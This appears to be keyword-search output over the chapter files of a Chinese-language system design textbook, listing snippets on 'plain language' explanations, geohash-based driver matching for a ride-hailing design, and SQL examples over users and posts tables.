  c09_b10.md: ...的中间服务。它集中处理横切关注点：认证、限流（rate limiting）、SSL 终止、请求路由、协议转换和日志。  plain 语言：API 网关是你的服务的前门。所有请求都通过它进入。它检查凭据、执行限制、路由到正确服务、记录所有日志——然后请...
  c10_b03.md: ...ext4、NTFS、APFS）在块存储之上提供文件抽象。数据库直接建在块设备之上（为最大控制），或使用文件系统文件。  plain 语言：块存储就是原始磁盘。没有任何结构强加——这是上层系统的工作。  **你在哪里遇到块存储：**  * 服务器中的物...
  c11_b02.md: ...任何服务器都能处理任何客户端的任何请求，因为请求包含处理它所需的所有信息。同一个请求路由到任何服务器都产生相同结果。  plain 语言：无状态服务器是可互换的。像自动售货机——你用哪台都一样；按同一个按钮，它们都给你同样的可乐。有状态服务器像认识你...
  c11_b07.md: ...p）  **垂直扩展**指增加单台机器资源：更多 CPU 核心、更大 RAM、更快存储。目标是让现有服务器更有能力。  plain 语言：垂直扩展就是升级机器。  **优点：**  * 简单：无需改代码。配置更大的实例并重启。 * 无协调开销：一台机...
  c11_b07.md: ...展（Scale Out）  **水平扩展**指增加更多机器，并行运行相同软件。不是一台强服务器，而是多台普通服务器。  plain 语言：水平扩展就是加机器。  **优点：**  * 理论上无上限：可以一直加服务器。 * 普通硬件：便宜、可互换的实例...
  c12_b02.md: ...续接收并应用变更、保持最终一致副本的数据库实例。副本通常是只读的——所有写都到主库，副本通过复制机制异步接收这些写。  plain 语言：主库是原始笔记本；每个副本都是一个人，在原始记录写完后几秒钟把它抄下来。读者可以查任何一份副本。写者必须总是找原...
  c12_b04.md: ...rd 合起来构成完整数据集。写被路由到拥有相关数据的 shard；读被路由到包含所请求数据的一个或多个 shard。  plain 语言：不是一家图书馆藏所有书，而是十家图书馆，每家藏十分之一的书。请求被路由到持有相关书的那家。  每个 shard...
  c12_b06.md: ...IN 需求的做法。tradeoff（权衡）是写复杂度增加（更新必须传播到所有副本），换取不需要 JOIN 的快速读。  plain 语言：不是维护一个权威用户名副本并在需要时查找，而是直接把用户名复制到每个需要它的表里。现在读取帖子时无需 JOIN...
  c12_b07.md: ...据存储（数据库、shard、服务）的事务，必须是原子的——要么所有操作都提交，要么都回滚——即使这些存储是独立系统。  plain 语言：你想对多个独立数据库施加一系列变更，就像它们是一个数据库一样，并保证永远不会看到部分状态。   #### 两阶段...
  c13_b02.md: ...通常是 HTTP/REST 或 gRPC），作为自己的进程（或一组进程）运行，并独立于其他服务进行部署、扩展和监控。  plain 语言：微服务是一个做一件事的程序，有自己的数据库，只通过定义好的接口与外界通信。如果它是人，会是专家——不是什么都懂的...
  c14_b01.md: ...。越强的一致性模型越容易推理，但实现越慢越难。越弱的一致性模型越快、越可用，但要求应用容忍并处理陈旧或不一致的数据。  plain 语言：一致性模型回答这个问题：“我现在写一个值，什么时候读能返回这个值？”   ### 14.2 强一致性——直观的理...
  c14_b02.md: ...consistent）**（线性化的）。存在一个单一、全局公认的操作顺序。一旦写完成，任何节点上的后续读都反映该写。  plain 语言：系统表现得好像只有一份数据，尽管实际上可能有很多。读总是返回最新值。没有陈旧读。  这是无副本（无复制，no r...
  c14_b02.md: ...系统就提供**最终一致性（eventual consistency）**。不保证何时收敛——只保证更新停止后会收敛。  plain 语言：如果你停止向系统写入，最终所有节点会达成一致。但写入进行中时，不同节点可能返回不同值。读可能是陈旧的。  这是第...
  c14_b04.md: ...tion）** 是分布式系统中某些节点因网络故障无法与其他节点通信的情况。节点被分成若干组，组内可通信，但跨组不能。  plain 语言：CAP 说你不能拥有一切。在网络分区——任何真实分布式系统中都会发生——你必须在**一致性**（返回错误或阻塞直...
  c14_b04.md: ...tor）**（或 **N**）是存储每份数据副本的节点数量。复制因子为 3 时，每次写同时存储在 3 个不同节点上。  plain 语言：复制因子就是你的数据有多少个备份副本。复制因子 3 意味着数据同时存在三台独立机器上——任意两台故障都不会丢数据...
  c14_b05.md: ...前必须确认的副本数。 * **读 quorum（R）：** 读操作返回结果前必须响应的副本数（返回最新版本的响应）。  plain 语言：quorum 就像副本之间的多数投票。一次写需要 W 票确认；一次读需要 R 票才能继续。巧妙之处在于，通过精心...
  c14_b06.md: ...r** 进程完成，使用一种叫 **Merkle tree（默克尔树）** 的数据结构来高效识别副本之间哪些数据不同。  plain 语言：反熵就是系统定期检查副本是否有分歧并修复它们。它是“最终一致性”里的“最终”——即使提示移交失败，反熵最终也会把...
  c14_b06.md: ...。Y“知道”X。 * **并发：** 如果 X 和 Y 互不因果前于对方，它们就是并发的。没有因果关系。这表明冲突。  plain 语言：向量时钟让你检测两个事件是否可能知道对方。如果它们不可能知道对方，那它们就是并发的，可能冲突。  向量时钟概念优...
  c14_b07.md: ...点上并发独立更新、并且总能合并成一致结果而无需协调的数据结构。其数学性质保证所有并发更新的顺序都会产生相同最终状态。  plain 语言：CRDT 是一种精心设计的数据结构，你可以以任意顺序应用更新，总能得到相同答案。没有冲突需要解决。  例子：...
  c15_b02.md: ...消息队列。生产者（通常是请求处理器）向队列发布任务。Worker 消费任务、执行并确认完成。失败的任务通常自动重试。  plain 语言：任务队列就是待办清单。你的 HTTP 处理器在清单上写“向用户 42 收取高级版费用”。后台 worker 拿起...
  c15_b03.md: ...如果一个操作执行多次产生的效果与执行一次相同，它就是**幂等的（idempotent）**。后续执行没有额外效果。  plain 语言：你按一次电梯按钮，电梯会来。你再按十次，电梯仍然只来一次。按按钮是幂等的——多按不会召唤更多电梯。  有些操作天...
  c15_b05.md: ...数据库，并发布消息或事件触发下一步。如果某步失败，saga 执行**补偿事务**——撤销之前已完成步骤效果反向操作。  plain 语言：不是一个大原子事务整体提交或回滚，saga 是一串较小事务。如果链中途失败，你不回滚——而是为已完成步骤运行“撤...
  c15_b06.md: ...协调风格：每个服务独立对事件做出反应并发布自己的事件。没有中央控制器。整体 saga 行为由各个服务交互涌现出来。  plain 语言：编舞就像爵士乐队即兴演奏。没人指挥。每个乐手倾听别人，根据听到的演奏自己的部分。音乐从他们互动中涌现。  编舞优...
  c15_b07.md: ...ga 协调风格：中央编排器服务驱动 saga，显式调用每一步并处理失败。编排器维护 saga 状态并知道完整工作流。  plain 语言：编排就像有指挥的管弦乐队。指挥告诉小提琴何时演奏、双簧管何时进入、铜管何时休止。指挥拥有完整乐谱；乐手按指示演奏...
  c15_b08.md: ...ox”表。一个独立进程（**消息中继，message relay**）从 outbox 表读取并向消息队列发布事件。  plain 语言：不是两个独立写入（数据库 + 消息队列），而是在一个事务里做两个数据库写入（业务数据 + 事件记录）。事务保证这...
  c16_b03.md: ...of failure，SPOF）** 是任何故障会导致整个系统失败的组件。如果移除该组件系统就宕，它就是 SPOF。  plain 语言：如果你某个东西只有一份，它失败整个系统就失败。一个数据库、一台服务器、一条网络路径——在添加冗余前都是 SPOF...
  c16_b05.md: ...进入**半开**状态，允许少量测试调用通过。如果测试成功，熔断器**闭合**（恢复正常）；如果失败，熔断器保持打开。  plain 语言：熔断器就是字面上的意思——检测到危险失败模式时断开电路的开关。像家里的保险丝盒，它通过切断失败组件来保护系统其余...
  c16_b06.md: ...资源池，把关键资源与非关键资源隔离（partitioning，分区）的技术。某类失败耗尽一个池的资源不会影响其他池。  plain 语言：这意味着不是用一个共享资源桶给所有东西使用，而是把桶分成独立隔间——一个失控的消费者不能抽干整个桶。  名字来自...
  c16_b07.md: ...* 是这样一条设计原则：当某些组件失败时，系统应继续提供部分功能，而不是完全失败。非必要功能先降级；核心功能受保护。  plain 语言：优雅降级意味着系统以有用的方式失败。不是返回空白错误页，而是返回功能减少的页面。有些功能缺失；核心体验仍在。...
  c17_b02.md: ...vel Indicator，SLI）** 是服务行为的精确定量测量。它是一个被选中作为用户体验有意义表示的具体指标。  plain 语言：SLI 回答“我如何衡量这个服务运行得好不好？”SocialSnap 例子：  * 请求成功率：返回非 5xx...
  c17_b03.md: ...Level Objective，SLO）** 是 SLI 的目标值。它是工程团队对自己承诺的服务应达到怎样的水平。  plain 语言：SLO 是你要命中的数字——“99.9% 请求成功”或“p99 延迟低于 200ms”。它是内部的，不是合同。...
  c17_b03.md: ...的后果。SLA 是外部的；SLO 是内部的。SLA 通常承诺得比内部 SLO 略低，以便服务触发罚金条款前留有余量。  plain 语言：SLA 是你对客户有法律承诺的东西，违反会有财务或法律后果。它总是设置得比内部 SLO 宽松，这样内部目标略有下...
  c17_b06.md: ...span 是一个工作单元，带开始时间和持续时间——以树形结构组织，每个 span 可能有子 span 代表下游调用。  plain 语言：追踪是一个完整时间线，准确显示哪些服务按什么顺序处理请求、每一步花多久—— stitched together...
  c19_b02.md: ...st Privilege）** 指出：每个实体——用户、服务、进程或系统——只应访问其完成职能所需的资源，不多不少。  plain 语言：给每个人最小必要访问，别多给。  Feed Service 用于读取帖子的数据库账户应只拥有 `posts` 表...
  c21_b02.md: ...与 HTTP 不同——HTTP 中客户端必须发起每个请求——WebSocket 允许连接建立后任何一方随时发送数据。  plain 语言：WebSocket 是电话线。HTTP 是一系列单独电话呼叫。WebSocket 让线路保持开放，任何一方有话就...
  c22_b03.md: ...列表获取）  最终 feed = merge(预计算_timeline, 我关注的 celebrity_posts)  plain 语言：不是对所有人承诺一种策略，混合扇出把便宜策略用在它便宜的地方（普通用户写时扇出），把昂贵读取策略用在写扇出将灾难...
  c23_b03.md: ...重要性排序 URL（重要 URL 先爬） 3. **调度层**，选择下一个从哪个域名队列拉取，遵守 crawl 延迟  plain 语言：URL frontier 是爬虫的待办清单，组织方式是重要工作先做，但没有任何单个网站被我们的请求压垮。   #...
  c23_b04.md: ...档列表。列表中的每个条目——称为 **posting** ——通常不仅存文档 ID，还存词在文档中的词频和出现位置。  plain 语言：倒排索引是一张查找表，对任意词，立即告诉你哪些文档包含它。索引成本在添加文档时支付一次；查询收益此后永远获得。...
  c23_b07.md: ...浪者无限跟随链接最终落在该页面的概率。来自高 PageRank 页面的许多入链使页面获得高 PageRank 分数。  plain 语言：PageRank 通过背书结构衡量可信度。许多可信页面链接你，你很可能也可信。高 PageRank 页面链接你，...
  c24_b02.md: ...5. **存储与分发：** 把所有编码片段存入 blob 存储（回忆第 10 章对象存储）并分发到 CDN 边缘节点  plain 语言：转码流水线是把一个原始视频变成多个可流式版本的工厂，每个版本被切成小块，可独立交付并随时切换。   #### 为...
  c24_b04.md: ...存层级：** 大型区域“中间层”缓存位于边缘服务器与源之间。本地缓存没有某片段的边缘服务器先从区域缓存获取，再回源。  plain 语言：CDN 是全球存储服务器网络，把热门内容副本放在离观众近的地方。东京观众不再从加州服务器取电影，东京边缘服务器持...
  c25_b02.md: ...sh 识别约 1.2km × 0.6km 区域；5 字符 geohash 识别约 4.9km × 4.9km 区域。  plain 语言：geohashing 把“我在纬度 37.77，经度 -122.41”变成 “9q8yy”——一个 5 字符字符...
  c26_b02.md: ...约 1/N 的比例。删除节点时，其键由顺时针邻居接管。集群变化时只有约 1/N 的键移动——相对模哈希是巨大改进。  plain 语言：一致性哈希把节点排成一个圆圈。键“落”到最近的顺时针节点。添加或删除节点只影响变化节点附近的键——其他键保持不动...
  c26_b03.md: ...最终一致性（eventual consistency）**：所有副本最终会达成一致，但在任意瞬间，某些副本可能滞后。  plain 语言：如果你总是写到至少 W 个节点、从至少 R 个节点读，且 W + R 超过副本总数 N，那么每次读都会联系到至少...
  c26_b04.md: ...新，B 丢弃其 hint。这就是 **hinted handoff**：B 为 A 临时保存数据，A 回来后再交还。  plain 语言：当某键的合法拥有者不可用时，邻居临时持有该键并贴条子（“这属于节点 A，A 回来时给它”）。A 回来时，邻居交还...
  c26_b04.md: ...子节点。如果只有左子节点哈希不同，分歧在左半 keyspace。递归进入左子树直到到达存在分歧的叶子（具体键范围）。  plain 语言：Merkle tree 是数据集的指纹。比较两个副本的 Merkle tree 只需 O(log N) 次哈希比...
  c26_b05.md: ...100 节点集群，gossip 约 log₂(100) ≈ 7 轮到达所有节点。T=1 秒时，完整传播约 7 秒。  plain 语言：gossip 是节点在没有中央目录的情况下相互交谈的方式。每个节点随机告诉邻居它知道的事；邻居把知识与自己的合并...
  c27_b04.md: ...更稳健但实现更慢的方案所隐含的 future cost。它是债务，因为像金融债务一样会累积利息：拖欠越久，越难偿还。  plain 语言：技术债务是“我们实际构建的”与“如果我们有无限时间和完美远见会构建的”之间的差距。它不是失败——而是权衡。  *...
  c28_b01.md: ...Law）** 指出：“设计系统的组织（此处使用广义的系统概念）必然会产生一种设计，其结构是该组织沟通结构的副本。”  plain 语言：软件映射了组织结构图。团队拥有组件，组件的沟通方式反映了团队的沟通方式。...
  c28_b04.md: ...er 处理所有基础设施：服务器分配、扩展、负载均衡和维护。开发者只为代码实际执行时间付费，而不为空闲服务器时间付费。  plain 语言：你写一个函数，上传到 AWS Lambda 或 Google Cloud Functions。请求来时，云 pr...

=== geohash (67 occurrences) ===
  c25_b02.md: ...查询。  **Geohashing** 通过把 2D 坐标映射成保留邻近性的 1D 字符串来解决。   #### 定义：Geohash  **Geohash** 是一种短的字母数字串，把地理坐标对编码成层次结构、保留邻近性的标识符。字符串长度决定精度：更...
  c25_b02.md: ...ashing** 通过把 2D 坐标映射成保留邻近性的 1D 字符串来解决。   #### 定义：Geohash  **Geohash** 是一种短的字母数字串，把地理坐标对编码成层次结构、保留邻近性的标识符。字符串长度决定精度：更短串代表更大地理区域；...
  c25_b02.md: ...获得位值 0；东半球 1。然后每一半再南北、东西交替二分。30 次二分后，编码位置可识别约 1m × 1m 的矩形。  Geohash 字符串是这些位的 Base32 编码。6 字符 geohash 识别约 1.2km × 0.6km 区域；5 字符 g...
  c25_b02.md: ...次二分后，编码位置可识别约 1m × 1m 的矩形。  Geohash 字符串是这些位的 Base32 编码。6 字符 geohash 识别约 1.2km × 0.6km 区域；5 字符 geohash 识别约 4.9km × 4.9km 区域。  pl...
  c25_b02.md: ...h 字符串是这些位的 Base32 编码。6 字符 geohash 识别约 1.2km × 0.6km 区域；5 字符 geohash 识别约 4.9km × 4.9km 区域。  plain 语言：geohashing 把“我在纬度 37.77，经度...
  c25_b02.md: ...”——一个 5 字符字符串，识别包含该位置约 5km × 5km 的单元格。该单元格内所有其他位置共享相同的 5 字符 geohash 前缀。   #### 为什么邻近保留重要  关键属性：两个地理位置接近的点倾向于共享较长的公共 geohash 前缀。...
  c25_b02.md: ...字符 geohash 前缀。   #### 为什么邻近保留重要  关键属性：两个地理位置接近的点倾向于共享较长的公共 geohash 前缀。1 km 外的司机很可能与乘客在同一 5 字符 geohash 单元格中。这意味着“找乘客 5 km 内所有司机...
  c25_b02.md: ...键属性：两个地理位置接近的点倾向于共享较长的公共 geohash 前缀。1 km 外的司机很可能与乘客在同一 5 字符 geohash 单元格中。这意味着“找乘客 5 km 内所有司机”可近似为“找 geohash 前缀 = [乘客 geohash] 的...
  c25_b02.md: ...外的司机很可能与乘客在同一 5 字符 geohash 单元格中。这意味着“找乘客 5 km 内所有司机”可近似为“找 geohash 前缀 = [乘客 geohash] 的所有司机”——对 geohash 字符串的单键查找或范围扫描。  这是与第 6...
  c25_b02.md: ...字符 geohash 单元格中。这意味着“找乘客 5 km 内所有司机”可近似为“找 geohash 前缀 = [乘客 geohash] 的所有司机”——对 geohash 字符串的单键查找或范围扫描。  这是与第 6 章键值存储的联系：司机位置存在键值...
  c25_b02.md: ...着“找乘客 5 km 内所有司机”可近似为“找 geohash 前缀 = [乘客 geohash] 的所有司机”——对 geohash 字符串的单键查找或范围扫描。  这是与第 6 章键值存储的联系：司机位置存在键值存储（Redis 或类似内存数据库）中...
  c25_b02.md: ...串的单键查找或范围扫描。  这是与第 6 章键值存储的联系：司机位置存在键值存储（Redis 或类似内存数据库）中，以 geohash 为键。找附近司机现在变成按 geohash 前缀键查找——查找本身是 O(1)。   #### Geohashing...
  c25_b02.md: ...键值存储的联系：司机位置存在键值存储（Redis 或类似内存数据库）中，以 geohash 为键。找附近司机现在变成按 geohash 前缀键查找——查找本身是 O(1)。   #### Geohashing 的边界情况  Geohashing 有已知局...
  c25_b02.md: ...身是 O(1)。   #### Geohashing 的边界情况  Geohashing 有已知局限：相邻地理区域有时 geohash 值完全不同，如果它们位于主要二分边界两侧。两个司机地理上可能只隔 10 米，但 geohash 前缀不同。  标准修复...
  c25_b02.md: ...局限：相邻地理区域有时 geohash 值完全不同，如果它们位于主要二分边界两侧。两个司机地理上可能只隔 10 米，但 geohash 前缀不同。  标准修复是查询目标单元格及其全部 8 个邻接单元格。由于每个单元格是 5km × 5km 且司机在 2D...
  c25_b02.md: ...查询。  **Geohashing** 通过把 2D 坐标映射成保留邻近性的 1D 字符串来解决。   #### 定义：Geohash  **Geohash** 是一种短的字母数字串，把地理坐标对编码成层次结构、保留邻近性的标识符。字符串长度决定精度：更...
  c25_b02.md: ...ashing** 通过把 2D 坐标映射成保留邻近性的 1D 字符串来解决。   #### 定义：Geohash  **Geohash** 是一种短的字母数字串，把地理坐标对编码成层次结构、保留邻近性的标识符。字符串长度决定精度：更短串代表更大地理区域；...
  c25_b02.md: ...获得位值 0；东半球 1。然后每一半再南北、东西交替二分。30 次二分后，编码位置可识别约 1m × 1m 的矩形。  Geohash 字符串是这些位的 Base32 编码。6 字符 geohash 识别约 1.2km × 0.6km 区域；5 字符 g...
  c25_b02.md: ...次二分后，编码位置可识别约 1m × 1m 的矩形。  Geohash 字符串是这些位的 Base32 编码。6 字符 geohash 识别约 1.2km × 0.6km 区域；5 字符 geohash 识别约 4.9km × 4.9km 区域。  pl...
  c25_b02.md: ...h 字符串是这些位的 Base32 编码。6 字符 geohash 识别约 1.2km × 0.6km 区域；5 字符 geohash 识别约 4.9km × 4.9km 区域。  plain 语言：geohashing 把“我在纬度 37.77，经度...
  c25_b02.md: ...”——一个 5 字符字符串，识别包含该位置约 5km × 5km 的单元格。该单元格内所有其他位置共享相同的 5 字符 geohash 前缀。   #### 为什么邻近保留重要  关键属性：两个地理位置接近的点倾向于共享较长的公共 geohash 前缀。...
  c25_b02.md: ...字符 geohash 前缀。   #### 为什么邻近保留重要  关键属性：两个地理位置接近的点倾向于共享较长的公共 geohash 前缀。1 km 外的司机很可能与乘客在同一 5 字符 geohash 单元格中。这意味着“找乘客 5 km 内所有司机...
  c25_b02.md: ...键属性：两个地理位置接近的点倾向于共享较长的公共 geohash 前缀。1 km 外的司机很可能与乘客在同一 5 字符 geohash 单元格中。这意味着“找乘客 5 km 内所有司机”可近似为“找 geohash 前缀 = [乘客 geohash] 的...
  c25_b02.md: ...外的司机很可能与乘客在同一 5 字符 geohash 单元格中。这意味着“找乘客 5 km 内所有司机”可近似为“找 geohash 前缀 = [乘客 geohash] 的所有司机”——对 geohash 字符串的单键查找或范围扫描。  这是与第 6...
  c25_b02.md: ...字符 geohash 单元格中。这意味着“找乘客 5 km 内所有司机”可近似为“找 geohash 前缀 = [乘客 geohash] 的所有司机”——对 geohash 字符串的单键查找或范围扫描。  这是与第 6 章键值存储的联系：司机位置存在键值...
  c25_b02.md: ...着“找乘客 5 km 内所有司机”可近似为“找 geohash 前缀 = [乘客 geohash] 的所有司机”——对 geohash 字符串的单键查找或范围扫描。  这是与第 6 章键值存储的联系：司机位置存在键值存储（Redis 或类似内存数据库）中...
  c25_b02.md: ...串的单键查找或范围扫描。  这是与第 6 章键值存储的联系：司机位置存在键值存储（Redis 或类似内存数据库）中，以 geohash 为键。找附近司机现在变成按 geohash 前缀键查找——查找本身是 O(1)。   #### Geohashing...
  c25_b02.md: ...键值存储的联系：司机位置存在键值存储（Redis 或类似内存数据库）中，以 geohash 为键。找附近司机现在变成按 geohash 前缀键查找——查找本身是 O(1)。   #### Geohashing 的边界情况  Geohashing 有已知局...
  c25_b02.md: ...身是 O(1)。   #### Geohashing 的边界情况  Geohashing 有已知局限：相邻地理区域有时 geohash 值完全不同，如果它们位于主要二分边界两侧。两个司机地理上可能只隔 10 米，但 geohash 前缀不同。  标准修复...
  c25_b02.md: ...局限：相邻地理区域有时 geohash 值完全不同，如果它们位于主要二分边界两侧。两个司机地理上可能只隔 10 米，但 geohash 前缀不同。  标准修复是查询目标单元格及其全部 8 个邻接单元格。由于每个单元格是 5km × 5km 且司机在 2D...
  c25_b03.md: ...求/秒分布到 API 服务器 2. **API 服务器层**（无状态、水平扩展——第 11 章）：验证请求，用计算出的 geohash 富化 3. **位置存储写入：** 写入 `(driver_id → current_location)` 并更新 g...
  c25_b03.md: ...h 富化 3. **位置存储写入：** 写入 `(driver_id → current_location)` 并更新 geohash 索引 4. **发布到位置事件流：** 向事件流（Kafka topic——第 8 章）发出更新，供下游系统消费（ET...
  c25_b03.md: ...理 500 万操作/秒。司机当前位置存为简单键值：`driver:{id}:location → {lat, lng, geohash, timestamp}`。   #### Geohash 索引  为让匹配服务找附近司机，系统维护反向索引：`geoh...
  c25_b03.md: ...ver:{id}:location → {lat, lng, geohash, timestamp}`。   #### Geohash 索引  为让匹配服务找附近司机，系统维护反向索引：`geohash:{cell} → 该单元格中的司机 ID 集合`。...
  c25_b03.md: ...hash, timestamp}`。   #### Geohash 索引  为让匹配服务找附近司机，系统维护反向索引：`geohash:{cell} → 该单元格中的司机 ID 集合`。司机从 geohash 单元格 A 移动到 B 时：  1. 从 A...
  c25_b03.md: ...为让匹配服务找附近司机，系统维护反向索引：`geohash:{cell} → 该单元格中的司机 ID 集合`。司机从 geohash 单元格 A 移动到 B 时：  1. 从 A 单元格集合中移除该司机 2. 把该司机加入 B 单元格集合 3. 更新司...
  c25_b03.md: ...OADD` 和 `GEORADIUS` 命令直接在坐标 sorted set 编码上实现地理空间查询——本质上是内置的 geohash 类空间索引。   #### 位置数据新鲜度  位置更新只有最近才有用。司机 10 分钟前的位置对匹配无意义——司机可能...
  c25_b03.md: ...求/秒分布到 API 服务器 2. **API 服务器层**（无状态、水平扩展——第 11 章）：验证请求，用计算出的 geohash 富化 3. **位置存储写入：** 写入 `(driver_id → current_location)` 并更新 g...
  c25_b03.md: ...h 富化 3. **位置存储写入：** 写入 `(driver_id → current_location)` 并更新 geohash 索引 4. **发布到位置事件流：** 向事件流（Kafka topic——第 8 章）发出更新，供下游系统消费（ET...
  c25_b03.md: ...理 500 万操作/秒。司机当前位置存为简单键值：`driver:{id}:location → {lat, lng, geohash, timestamp}`。   #### Geohash 索引  为让匹配服务找附近司机，系统维护反向索引：`geoh...
  c25_b03.md: ...ver:{id}:location → {lat, lng, geohash, timestamp}`。   #### Geohash 索引  为让匹配服务找附近司机，系统维护反向索引：`geohash:{cell} → 该单元格中的司机 ID 集合`。...
  c25_b03.md: ...hash, timestamp}`。   #### Geohash 索引  为让匹配服务找附近司机，系统维护反向索引：`geohash:{cell} → 该单元格中的司机 ID 集合`。司机从 geohash 单元格 A 移动到 B 时：  1. 从 A...
  c25_b03.md: ...为让匹配服务找附近司机，系统维护反向索引：`geohash:{cell} → 该单元格中的司机 ID 集合`。司机从 geohash 单元格 A 移动到 B 时：  1. 从 A 单元格集合中移除该司机 2. 把该司机加入 B 单元格集合 3. 更新司...
  c25_b03.md: ...OADD` 和 `GEORADIUS` 命令直接在坐标 sorted set 编码上实现地理空间查询——本质上是内置的 geohash 类空间索引。   #### 位置数据新鲜度  位置更新只有最近才有用。司机 10 分钟前的位置对匹配无意义——司机可能...
  c25_b04.md: ...秒内找到司机  乘客请求用车时，匹配服务必须找到合适司机并在 30 秒内确认接受。  匹配算法：  1. **计算乘客 geohash**（5 字符精度：约 5km 单元格） 2. **查询司机索引：** 找乘客 geohash 单元格及 8 个邻接单元...
  c25_b04.md: ...：  1. **计算乘客 geohash**（5 字符精度：约 5km 单元格） 2. **查询司机索引：** 找乘客 geohash 单元格及 8 个邻接单元格中的所有可用司机 3. **候选排序：** 按估算到乘客位置的驾驶时间排序（使用预计算 ET...
  c25_b05.md: ...重  对每次活跃行程（100 万同时行程）实时计算精确 ETA 在计算上不可行。技巧是 **分层预计算**：定期预计算 geohash 单元格（5km 区域）之间的 ETA。对具体司机-乘客对，用预计算单元格-单元格 ETA 做快速近似，只有当司机在乘客...
  c25_b05.md: ...放弃）并增加供给（更高收入使更多司机愿意上线）。  动态加价实现为一个控制循环：  1. **监控：** 持续观察每个 geohash 单元格的 ride request 与可用司机比率，按滚动 5 分钟窗口聚合 2. **触发：** 若 request...
  c25_b07.md: ...--- 位置追踪 | Redis 集群（内存） | 最终一致（可接受 5 秒陈旧） | 每次更新 < 100ms 司机 geohash 索引 | Redis 集群 | 最终一致 | 每次更新 < 100ms 匹配服务 | PostgreSQL + 分布式...
  c25_b07.md: ...tly-once） | 每次计费 < 3 秒  事件流（Kafka）连接这些子系统：司机位置更新发布到 Kafka，由 geohash 索引更新器、ETA 重算服务、动态加价监控和乘客地图显示服务并行消费。  这是第 8 章事件驱动架构在拼车规模上的运行...
  c25_b07.md: ...# 拼车权衡矩阵  设计选择 | 延迟 | 一致性 | 可用性 | 运营复杂度 ---|---|---|---|--- Geohash 空间索引 | 极低（键查找） | 最终一致（边界边界情况） | 极高 | 低 Redis 位置追踪 | 极低（< 5m...
  c25_b07.md: ...--- 位置追踪 | Redis 集群（内存） | 最终一致（可接受 5 秒陈旧） | 每次更新 < 100ms 司机 geohash 索引 | Redis 集群 | 最终一致 | 每次更新 < 100ms 匹配服务 | PostgreSQL + 分布式...
  c25_b07.md: ...tly-once） | 每次计费 < 3 秒  事件流（Kafka）连接这些子系统：司机位置更新发布到 Kafka，由 geohash 索引更新器、ETA 重算服务、动态加价监控和乘客地图显示服务并行消费。  这是第 8 章事件驱动架构在拼车规模上的运行...
  c25_b07.md: ...# 拼车权衡矩阵  设计选择 | 延迟 | 一致性 | 可用性 | 运营复杂度 ---|---|---|---|--- Geohash 空间索引 | 极低（键查找） | 最终一致（边界边界情况） | 极高 | 低 Redis 位置追踪 | 极低（< 5m...
  c25_b08.md: ...**答案：** Geohashing 把地理坐标（纬度、经度）编码成一个识别矩形单元格的短字符串。附近位置倾向于共享 geohash 前缀——同一单元格内所有位置共享相同完整 geohash 字符串。匹配服务用 geohash 作为键找区域内司机。然而...
  c25_b08.md: ...经度）编码成一个识别矩形单元格的短字符串。附近位置倾向于共享 geohash 前缀——同一单元格内所有位置共享相同完整 geohash 字符串。匹配服务用 geohash 作为键找区域内司机。然而，两个点可能地理相邻但位于 geohash 单元格边界两侧...
  c25_b08.md: ...符串。附近位置倾向于共享 geohash 前缀——同一单元格内所有位置共享相同完整 geohash 字符串。匹配服务用 geohash 作为键找区域内司机。然而，两个点可能地理相邻但位于 geohash 单元格边界两侧，从而得到完全不同的哈希字符串。司机...
  c25_b08.md: ...置共享相同完整 geohash 字符串。匹配服务用 geohash 作为键找区域内司机。然而，两个点可能地理相邻但位于 geohash 单元格边界两侧，从而得到完全不同的哈希字符串。司机可能离乘客只有 10 米，却在单元格 “9q8yy” 而乘客在 “9...
  c25_b10.md: ...000 写入/秒。每司机存储：`driver:{id}:location` 存 lat（8 字节）、lng（8 字节）、geohash（8 字节）、timestamp（8 字节）≈ 32 字节/键。加上 geohash 索引开销（每个司机出现在一个 ge...
  c25_b10.md: ...t（8 字节）、lng（8 字节）、geohash（8 字节）、timestamp（8 字节）≈ 32 字节/键。加上 geohash 索引开销（每个司机出现在一个 geohash 集合中）。总存储估算：500,000 × ~200 字节（含 Redis...
  c25_b10.md: ...sh（8 字节）、timestamp（8 字节）≈ 32 字节/键。加上 geohash 索引开销（每个司机出现在一个 geohash 集合中）。总存储估算：500,000 × ~200 字节（含 Redis 开销）= 100 MB——微不足道，远小于单...
  c25_b10.md: ...。单个 Redis 节点 500,000 操作/秒对写入 alone 有充足余量，但还要处理读取（乘客查询附近司机）和 geohash 索引更新（每次位置变化 2 次集合操作 = 3 次总操作）。总操作/秒：500,000 × 3 = 150 万（1.5...
  c25_b12.md: ...被接受或超时。这进而要求司机通知系统（推送通知）必须快速可靠——缓慢的推送通知路径可能吃掉整个匹配预算。延迟要求也约束 geohash 精度：5 字符 geohash（5km 单元格）足够大以包含许多司机实现快速查找，又足够小以避免返回数千无关结果。选...
  c25_b12.md: ...系统（推送通知）必须快速可靠——缓慢的推送通知路径可能吃掉整个匹配预算。延迟要求也约束 geohash 精度：5 字符 geohash（5km 单元格）足够大以包含许多司机实现快速查找，又足够小以避免返回数千无关结果。选 3 字符 geohash（600...
  c25_b12.md: ...字符 geohash（5km 单元格）足够大以包含许多司机实现快速查找，又足够小以避免返回数千无关结果。选 3 字符 geohash（600km 单元格）会返回区域内所有司机——无用。选 8 字符 geohash（40m 单元格）通常包含零个司机——也...
  c25_b12.md: ...小以避免返回数千无关结果。选 3 字符 geohash（600km 单元格）会返回区域内所有司机——无用。选 8 字符 geohash（40m 单元格）通常包含零个司机——也无用。城市物理（平均车速 × 匹配预算）决定合适单元格大小。这是反向应用的侦探纪...
  c25_b12.md: ...定合适单元格大小。这是反向应用的侦探纪律：给定约束（30 秒，~40 km/h 城市速度），最大搜索半径约 500 米，geohash 精度由此推出。本章每个架构决策最终都源于这两个数字：4 秒和 30 秒。  **Q2.** 拼车公司积累大量用户位置数...

=== posts (66 occurrences) ===
  c05_b01.md: ...| carol | carol@example.com | `$2b$12...` | 2024-02-01 |  **posts 表**  | id | user_id | content | created_at | |---|---|---|-...
  c05_b01.md: ...2024-01-21 | | 103 | 1 | "Second post!" | 2024-01-22 |  注意 posts 表里的 `user_id` 列。Post 101 的 `user_id = 1`，指向 users 表中的 Alice...
  c05_b02.md: ...给我看 Alice 的所有帖子，连同 Alice 的用户名：”      SELECT users.username, posts.content, posts.created_at     FROM posts     JOIN users ON...
  c05_b02.md: ...，连同 Alice 的用户名：”      SELECT users.username, posts.content, posts.created_at     FROM posts     JOIN users ON posts.user_id =...
  c05_b02.md: ...CT users.username, posts.content, posts.created_at     FROM posts     JOIN users ON posts.user_id = users.id     WHERE users....
